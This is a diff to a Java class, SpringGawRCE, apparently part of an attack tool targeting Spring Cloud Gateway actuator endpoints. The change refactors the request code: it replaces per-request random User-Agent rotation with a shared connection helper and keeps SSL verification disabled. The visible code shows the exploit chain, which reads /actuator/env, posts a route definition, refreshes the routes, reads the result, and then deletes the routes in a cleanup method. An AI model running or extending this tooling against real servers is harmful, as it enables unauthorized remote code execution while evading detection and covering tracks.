@@ -1,6 +1,6 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
@@ -8,16 +8,13 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
-import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Collectors;
-import java.util.stream.Stream;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class SpringGawRCE {
     public String address;
@@ -72,16 +69,10 @@ public class SpringGawRCE {
         String api = "";
         String data = "";
         String res = "";
-        String ua = "";
         String text = "";
         String refapi = "";
         disableSSLVerification();
-        URL obj = new URL(address + "/actuator/env");
-        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-        UA_Config uacf = new UA_Config();
-        List<String> ualist = uacf.loadUserAgents();
-        ua = uacf.getRandomUserAgent(ualist);
-        conn.setRequestProperty("User-Agent",ua);
+        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
         conn.setRequestMethod("GET");
         conn.setDoOutput(true);
         int responseCode = conn.getResponseCode();
@@ -108,10 +99,7 @@ public class SpringGawRCE {
         }
         String site = address + api;
         try {
-            URL obj1 = new URL(site);
-            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn1.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
             conn1.setRequestMethod("POST");
             conn1.setRequestProperty("Content-Type", "application/json");
             conn1.setDoOutput(true);
@@ -122,19 +110,13 @@ public class SpringGawRCE {
             int responseCode1 = conn1.getResponseCode();
             if (responseCode1 == HttpURLConnection.HTTP_CREATED) {
                 String site1 = address + refapi;
-                URL obj2 = new URL(site1);
-                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn2.setRequestProperty("User-Agent",ua);
+                HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
                 conn2.setRequestMethod("POST");
                 conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                 conn2.setDoOutput(true);
                 int responseCode2 = conn2.getResponseCode();
                 if (responseCode2 == HttpURLConnection.HTTP_OK) {
-                    URL obj3 = new URL(site);
-                    HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn3.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn3 = HTTPConfig.createConnection(site);
                     conn3.setRequestMethod("GET");
                     conn3.setDoOutput(true);
                     BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
@@ -181,17 +163,11 @@ public class SpringGawRCE {
     public void DelGaw(ResultCallback callback) throws IOException{
         String api = "";
         String api1 = "";
-        String ua = "";
         String expapi = "";
         String text = "";
         String refapi = "";
         disableSSLVerification();
-        URL obj = new URL(address + "/actuator/env");
-        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-        UA_Config uacf = new UA_Config();
-        List<String> ualist = uacf.loadUserAgents();
-        ua = uacf.getRandomUserAgent(ualist);
-        conn.setRequestProperty("User-Agent",ua);
+        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
         conn.setRequestMethod("GET");
         conn.setDoOutput(true);
         int responseCode = conn.getResponseCode();
@@ -210,33 +186,21 @@ public class SpringGawRCE {
         String site1 = address + api1;
         String site2 = address + expapi;
         try {
-            URL obj1 = new URL(site);
-            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn1.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
             conn1.setRequestMethod("DELETE");
             conn1.setDoOutput(true);
             int responseCode1 = conn1.getResponseCode();
-            URL obj2 = new URL(site1);
-            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn2.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
             conn2.setRequestMethod("DELETE");
             conn2.setDoOutput(true);
             int responseCode2 = conn2.getResponseCode();
-            URL obj3 = new URL(site2);
-            HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn3.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn3 = HTTPConfig.createConnection(site2);
             conn3.setRequestMethod("DELETE");
             conn3.setDoOutput(true);
             int responseCode3 = conn3.getResponseCode();
             if (responseCode1 == HttpURLConnection.HTTP_OK || responseCode2 == HttpURLConnection.HTTP_OK || responseCode3 == HttpURLConnection.HTTP_OK) {
                 String refsite = address + refapi;
-                URL refobj = new URL(refsite);
-                HttpURLConnection refconn = (HttpURLConnection) refobj.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                refconn.setRequestProperty("User-Agent",ua);
+                HttpURLConnection refconn = HTTPConfig.createConnection(refsite);
                 refconn.setRequestMethod("POST");
                 refconn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                 refconn.setDoOutput(true);
